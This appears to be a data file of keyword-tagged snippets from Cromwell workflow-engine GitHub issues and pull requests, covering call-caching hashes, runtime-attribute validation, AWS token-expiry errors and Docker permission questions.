scala.collection.TraversableLike$WithFilter.foreach(Traversa,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2438:3201,Hash,HashMap,3201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2438,2,['Hash'],"['HashMap', 'HashTrieMap']"
Security,Just after merging the runtime attributes validation I realized that there is a better way to get a JesBackend instance in the tests than mocking half of Cromwell.. so here it is,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/388:42,validat,validation,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/388,1,['validat'],['validation']
Security,"Just noticed, this PR uses different hashes for conformance tests for Local / PapiV1 / PapiV2. I'm assuming that was not intentional. I have an incoming PR (as soon as PRs quiet down + I get travis to pass for once) that refactors this into reusable includes. That will hopefully help making CI changes in the future.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3627#issuecomment-389284660:37,hash,hashes,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3627#issuecomment-389284660,1,['hash'],['hashes']
Security,Just to note that it might be slightly not backward compatible as people who have their accounts set up such that they gave the default compute service account access to the data they need will now also have to ensure the `user_service_account` also has access to the data (which may already be the case but..); Otherwise it should be pretty straightforward to do.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3085#issuecomment-353350550:160,access,access,160,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3085#issuecomment-353350550,2,['access'],['access']
Security,"K.I.S.S. indeed. 👍 to the code diff. Your comments do help, but I'm still only at about 75% in understanding of what initialization actors can and cannot validate currently. I'm fine if folks file issues with example ""enhancements"" for the future. One could also write a large suite of tests with runtime attribute expressions that should and should not validate, but that's another ticket to be prioritized. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1240/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1240#issuecomment-236930516:154,validat,validate,154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1240#issuecomment-236930516,2,['validat'],['validate']
Security,"Latest on aws_backend branch. ________________________________; From: mcovarr <notifications@github.com>; Sent: Thursday, June 7, 2018 6:47:04 AM; To: broadinstitute/cromwell; Cc: Thomas Dyar (EXTERNAL); Author; Subject: Re: [broadinstitute/cromwell] Strange ""Boxed Error"", probably authorization / config (#3736). Also what version of Cromwell is this?. —; You are receiving this because you authored the thread.; Reply to this email directly, view it on GitHub<https://urldefense.proofpoint.com/v2/url?u=https-3A__github.com_broadinstitute_cromwell_issues_3736-23issuecomment-2D395377185&d=DwMCaQ&c=n7UHtw8cUfEZZQ61ciL2BA&r=Wpxr3yZIgJUDc4CsPhUpuiAtTKDn_lya4DWla3Q21iI&m=vxqjxBUg7eYY0Pzk0lUj-fru5Fu_Xj93aim9v5CyjEk&s=U0Ofhj4NWKhfebpsRfeTCvMxBZRUhJ44bevIpm6SR-E&e=>, or mute the thread<https://urldefense.proofpoint.com/v2/url?u=https-3A__github.com_notifications_unsubscribe-2Dauth_AIfLudmaJuhICx-5FxkNqusXZWh8pJ14zvks5t6QSogaJpZM4UdPeJ&d=DwMCaQ&c=n7UHtw8cUfEZZQ61ciL2BA&r=Wpxr3yZIgJUDc4CsPhUpuiAtTKDn_lya4DWla3Q21iI&m=vxqjxBUg7eYY0Pzk0lUj-fru5Fu_Xj93aim9v5CyjEk&s=qPDfKyTsVifxuNzZbVjE9HCwrHl6ANQrTo9wh-9YTJE&e=>.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395392027:283,authoriz,authorization,283,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395392027,1,['authoriz'],['authorization']
Security,Lazy creation of WorkflowDescriptor in WorkflowManagerActor only after Validation succeeds,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/544:71,Validat,Validation,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/544,1,['Validat'],['Validation']
Security,"Le sigh. Need to now fix ""Method DELETE is not allowed by Access-Control-Allow-Methods."" back in lenthall. Brb. Again.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/250#issuecomment-150628371:58,Access,Access-Control-Allow-Methods,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/250#issuecomment-150628371,1,['Access'],['Access-Control-Allow-Methods']
Security,"Linking vs not doing anything still does have an impact regarding call caching.; For example, currently on SFS if you use the ""hash the file path"" strategy, then you have to use symlink in order for it to work otherwise we have no way to know the original file path and hence call caching breaks. If we provided the ""don't do anything option"" on SFS too it would be another way to get call caching to work with ""file path hashing"".; I'm just saying there is a soup of options regarding hashing and file duplication that would be nice to get as coherent as possible (even though like you said linking on GCS doesn't make sense). And I agree that all of this might very well be an implementation detail :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306249534:127,hash,hash,127,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2330#issuecomment-306249534,3,['hash'],"['hash', 'hashing']"
Security,"Local Cromwell & CromIAM, pointed at Sam dev,. `/describe` endpoint:. Disabled user `anichols@broadinstitute.org`; ```; 403 Forbidden; The supplied authentication is not authorized to access this resource; ```; Enabled user `oednichols@gmail.com`; ```; 200 OK; {; 	""valid"": true,; 	""errors"": [],; 	""validWorkflow"": true,; 	""name"": ""HelloWorld"",; 	""inputs"": [],; 	""outputs"": [],; 	""images"": [],; 	""submittedDescriptorType"": {; 		""descriptorType"": ""WDL"",; 		""descriptorTypeVersion"": ""1.0""; 	},; 	""importedDescriptorTypes"": [],; 	""meta"": {},; 	""parameterMeta"": {},; 	""isRunnableWorkflow"": true; }; ```. `/backends` endpoint:. Disabled user `anichols@broadinstitute.org`; ```; 403 Forbidden; The supplied authentication is not authorized to access this resource; ```; Enabled user `oednichols@gmail.com`; ```; 200 OK; {; 	""defaultBackend"": ""Local"",; 	""supportedBackends"": [; 		""Local"",; 		""LocalBourneShell"",; 		""LocalCacheableRuntimeAttribute"",; 		""LocalDockerSecure"",; 		""LocalNoDocker""; 	]; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6826:148,authenticat,authentication,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6826,6,"['access', 'authenticat', 'authoriz']","['access', 'authentication', 'authorized']"
Security,Local backend validation#433,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/476:14,validat,validation,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/476,1,['validat'],['validation']
Security,Log access URLs with sensitive parts masked BT-235,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6333:4,access,access,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6333,1,['access'],['access']
Security,"Log message that gets repeated over and over:. 2020-01-08 15:15:57,852 cromwell-system-akka.actor.default-dispatcher-28 ERROR - Failure fetching statuses for AWS jobs in Initializing. No updates will occur.; software.amazon.awssdk.services.batch.model.BatchException: The security token included in the request is expired (Service: Batch, Status Code: 403, Request ID: 6312adeb-b603-48ff-8a3b-fd099e6805ef); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.handleErrorResponse(HandleResponseStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.handleResponse(HandleResponseStage.java:73); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:58); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:41); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:63); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:36); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:77); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:39); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.doExecute(RetryableStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.execute(RetryableStage.java:88); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:64); 	a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-572126033:272,secur,security,272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-572126033,1,['secur'],['security']
Security,"Logs:; 2019-10-09 14:05:52,263 cromwell-system-akka.actor.default-dispatcher-2 ERROR - Failure fetching statuses for AWS jobs in Initializing. No updates will occur.; software.amazon.awssdk.services.batch.model.BatchException: The security token included in the request is expired (Service: Batch, Status Code: 403, Request ID: 842776aa-1862-43dc-a286-95d0b902319e); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.handleErrorResponse(HandleResponseStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.handleResponse(HandleResponseStage.java:73); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:58); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:41); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:63); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:36); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:77); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:39); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.doExecute(RetryableStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.execute(RetryableStage.java:88); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:64); 	at software.amazon.awssdk.core.internal.ht",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:231,secur,security,231,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,1,['secur'],['security']
Security,"Looking at the existing `JobPreparationActor` code I saw that the Docker hash credentials are being created by calling this method in `BackendLifecycleActorFactory`:; ```; def dockerHashCredentials(initializationDataOption: Option[BackendInitializationData]): List[Any] = List.empty; ```; The JES backend overrides this to return a non-empty `List`. Since we don't yet have the required `BackendInitializationData` during workflow materialization, @Horneth suggested the Docker hash calculation be performed slightly downstream in workflow initialization instead.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289156621:73,hash,hash,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-289156621,2,['hash'],['hash']
Security,"Looking at this with Cromwell 24, the user can be specified with a config like:. ```; default = ""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; runtime-attributes = """"""; String? docker; String? docker_user; """"""; submit-docker = """"""docker run --rm ${ ""--user "" + docker_user } -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash ${docker_cwd}/execution/script""""""; .; .; .; ```. The WDL can pass in `docker_user` as a runtime attribute, which could be an expression involving an input or just a hardcoded value. But even with a container path not under `/root`, there are currently permissions problems that prevent this from working due to the different users inside and outside the Docker container. It may be possible to `chmod` and `umask` our way past these problems, but I need to think through the security implications of doing so. Maybe making this more liberal behavior an opt-in configuration value in the backend config would be okay?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/472#issuecomment-271364535:878,secur,security,878,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/472#issuecomment-271364535,1,['secur'],['security']
Security,"Looks awesome to me. Thinking out loud.....:. - (PO q) If a hash lookup fails (i.e. I mean the dockerhub request, not the expression evaluation), not even starting the workflow might be the expected behaviour, because ""don't waste my money starting an entire analysis when in 2 minutes I can resubmit and get CC""?; - (Separate ticket?) Should we also have a ""disable docker hash cache"" option, for Lee's very-fast iterations? Or just a ""clear hash cache"" REST endpoint?; - ToL: The hash lookup cache may also need to be aware of local vs remote hashes; - ToL: one step further away from dynamic backend assignment 😢",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-283975797:60,hash,hash,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2048#issuecomment-283975797,10,['hash'],"['hash', 'hashes']"
Security,"Looks good to me. I tried to make some sense of this compiler error this morning. One thing to note is that `sbt compile` does work, but it's the assembly that seems to be creating the issues. Judging from the output of `sbt assembly`, I think perhaps it could be a conflict with another library, because it seems to have the error immediately after importing a bunch of JARs:. ```; ...; [info] Including: jackson-jaxrs-json-provider-2.4.1.jar; [info] Including: jackson-module-jsonSchema-2.4.1.jar; [info] Including: jackson-jaxrs-base-2.4.1.jar; [error] missing or invalid dependency detected while loading class file 'WorkflowStatusResponse.class'.; [error] Could not access type AnyRef in package scala,; [error] because it (or its dependencies) are missing. Check your build definition for; [error] missing or conflicting dependencies. (Re-run with `-Ylog-classpath` to see the problematic classpath.); [error] A full rebuild may help if 'WorkflowStatusResponse.class' was compiled against an incompatible version of scala.; [error] missing or invalid dependency detected while loading class file 'WorkflowSubmitResponse.class'.; [error] Could not access type AnyRef in package scala,; [error] because it (or its dependencies) are missing. Check your build definition for; [error] missing or conflicting dependencies. (Re-run with `-Ylog-classpath` to see the problematic classpath.); [error] A full rebuild may help if 'WorkflowSubmitResponse.class' was compiled against an incompatible version of scala.; [error] two errors found; [error] (test:compileIncremental) Compilation failed; [error] Total time: 32 s, completed Jun 2, 2015 8:39:34 AM; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107940395:671,access,access,671,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/30#issuecomment-107940395,2,['access'],['access']
Security,Lookup docker hash locally,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2095:14,hash,hash,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2095,1,['hash'],['hash']
Security,"MBER output. This should correspond to the output_dir used in AMBER.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-amber\""\n },\n \""id\"": \""#purple-2.44.cwl/amber\""\n },\n {\n \""type\"": [\n \""null\"",\n \""File\""\n ],\n \""doc\"": \""Location of circos binary.\\nOptional path to circos binary.\\nWhen supplied, circos graphs will be written to <output_dir>/plot\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-circos\""\n },\n \""id\"": \""#purple-2.44.cwl/circos\""\n },\n {\n \""type\"": \""Directory\"",\n \""doc\"": \""Path to COBALT output. This should correspond to the output_dir used in COBALT.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-cobalt\""\n },\n \""id\"": \""#purple-2.44.cwl/cobalt\""\n },\n {\n \""type\"": [\n \""null\"",\n \""boolean\""\n ],\n \""doc\"": \""Optionally include if you wish to persist results to a database. Database initialization script can be found here.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-db_enabled\""\n },\n \""id\"": \""#purple-2.44.cwl/db_enabled\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""Database password. Mandatory if db_enabled.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-db_pass\""\n },\n \""id\"": \""#purple-2.44.cwl/db_pass\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""Database url in form: mysql://host:port/database\\nMandatory if db_enabled.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-db_url\""\n },\n \""id\"": \""#purple-2.44.cwl/db_url\""\n },\n {\n \""type\"": [\n \""null\"",\n \""string\""\n ],\n \""doc\"": \""Database user name. Mandatory if db_enabled.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-db_user\""\n },\n \""id\"": \""#purple-2.44.cwl/db_user\""\n },\n {\n \""type\"": [\n \""null\"",\n \""boolean\""\n ],\n \""doc\"": \""Persist data to DB.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-driver_catalog\""\n },\n \""default\"": false,\n \""id\"": \""#purple-2.44.cwl/driver_catalog\""\n },\n {\n \""type\"": \""File\"",\n \""doc\"": \""Path to GC profile.\\n\"",\n \""inputBinding\"": {\n \""prefix\"": \""-gc_profile\""\n },\n \""id\"": \""#purple-2.44.cw",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5826:93458,password,password,93458,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5826,1,['password'],['password']
Security,METADATA_VALUE|; |-----------------------|------------|--------------|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:result|Cache Miss|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:result|Cache Miss|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:2251,hash,hashes,2251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"Made GoogleAuthMode scopes optional via a param/conf, still defaulting to the pipelines api scopes.; Removed unused scopes and data-dirs from google auth modes that do not uses them.; Moved access token TTL refresher from GcrAbstractFlow to GoogleAuthMode.; Fixed queryPostRoute logging method as ""GET"" instead of ""POST"".",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3369:190,access,access,190,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3369,1,['access'],['access']
Security,Made call cache hash endpoint more JSONic,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2471:16,hash,hash,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2471,1,['hash'],['hash']
Security,"Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.IllegalArgumentException: /Volumes/nextseq_ngs/180405_NB501680_0019_AHKGNJBGX5.tar.lz4 exists on a filesystem not supported by this instance of Cromwell. Supported filesystems are: s3. Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; 	at cromwell.core.path.PathParsingException.<init>(PathParsingException.scala:5); 	... 35 common frames omitted; 2018-06-13 14:29:48,009 cromwell-system-akka.dispatchers.engine-dispatcher-32 ERROR - a67833cb:demux_only.illumina_demux:-1:1: Hash error, disabling call caching for this job.; cromwell.core.path.PathParsingException: java.lang.IllegalArgumentException: /Volumes/nextseq_ngs/180405_NB501680_0019_AHKGNJBGX5.tar.lz4 exists on a filesystem not supported by this instance of Cromwell. Supported filesystems are: s3. Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; 	at cromwell.core.path.PathFactory$.$anonfun$buildPath$4(PathFactory.scala:47); 	at scala.Option.getOrElse(Option.scala:121); 	at cromwell.core.path.PathFactory$.buildPath(PathFactory.scala:42); 	at cromwell.core.path.PathFactory.buildPath(PathFactory.scala:29); 	at cromwell.core.path.PathFactory.buildPath$(PathFactory.scala:29); 	at cromwell.backend.impl.aws.AwsBatchWorkflowPaths.buildPath(AwsBatchWorkflowPaths.scala:51); 	at cromwell.backend.io.WorkflowPaths.$anonfun$getPath$1(WorkflowPaths.scala:43); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3774:8843,Hash,Hash,8843,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3774,1,['Hash'],['Hash']
Security,"Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [2016-10-28 14:37:35,25] [error] Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:170); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:930); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94); at",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:2274,secur,security,2274,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['secur'],['security']
Security,"Main purpose of this PR is to validate the idea of ""Runtime Attributes validation"" at Backend **initialization** an **execution** level. [x] LocalBackend; - Initialization => No runtime attribute keys validation. Just a warning for those attributes that are not supported.; - Execution => Validate values of supported runtime attributes. [x] JesBackend; - Initialization => Validate Docker key is present and warn for those attributes that are not supported.; - Execution => Validate values of supported runtime attributes. [x] HtCondorBackend; - Initialization => No runtime attribute keys validation. Just a warning for those attributes that are not supported.; - Execution => Validate values of supported runtime attributes. [x] SgeBackend; - Initialization => No runtime attribute keys validation. Just a warning for those attributes that are not supported.; - Execution => Validate values of supported runtime attributes. The idea is to have this public while I implement this functionality so we all are in the same page.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/746:30,validat,validate,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/746,10,"['Validat', 'validat']","['Validate', 'validate', 'validation']"
Security,Make /query endpoint accessible for testing,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4715:21,access,accessible,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4715,1,['access'],['accessible']
Security,Make Cromwell 27 Docker hashing consistent with 26,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2360:24,hash,hashing,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2360,1,['hash'],['hashing']
Security,Make parsing of runtime attributes far more robust via ValidationNELs…,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/163:55,Validat,ValidationNELs,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/163,1,['Validat'],['ValidationNELs']
Security,Make sure Terra users have access to view Batch GUI in GCP Console,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7478:27,access,access,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7478,1,['access'],['access']
Security,"Make sure to also follow up on linked RFEs from Mike Noble. ----. I have in my WDL output a glob of an array of files like this : . ```; 	Array[File] ais=glob(""*.png""); ```. Then in my output (in the bucket) I see a list file and a ""directory"" (both having a hash) listing and containing files picked up from the glob. ```; gsutil cat gs://fc-9c84e685-79f8-4d84-9e52-640943257a9b/3beb06ee-6f01-4a9d-8bb7-e8eacd214561/lego_plotter_workflow/f525deea-91b9-4365-b31d-2a2a3ae3346d/call-lego_plotter_task/glob-fc36854b6867c1581ab159b09dd7e2f4.list; THCA-BJ-A0Z2-TP-NB.maf.mutation_CCG_histogram.png; THCA-BJ-A0Z2-TP-NB.maf.mutation_coverage.png; THCA-BJ-A0Z2-TP-NB.maf.mutation_histogram.png; THCA-BJ-A0Z2-TP-NB.maf.mutation_orientation_alt_counts.png; THCA-BJ-A0Z2-TP-NB.maf.mutation_orientation_weighted_mutations.png; THCA-BJ-A0Z2-TP-NB.maf.mutation_profile.png; THCA-BJ-A0Z2-TP-NB.maf.mutation_profile_AF.png; THCA-BJ-A0Z2-TP-NB.maf.mutation_profile_counts.png; THCA-BJ-A0Z2-TP-NB.maf.mutation_profile_normalized.png; THCA-BJ-A0Z2-TP-NB.maf.mutation_profile_samples_1-1.png; ```. (here are the PNGs). ```; wm8b1-75c:lp_glob esalinas$ gsutil ls 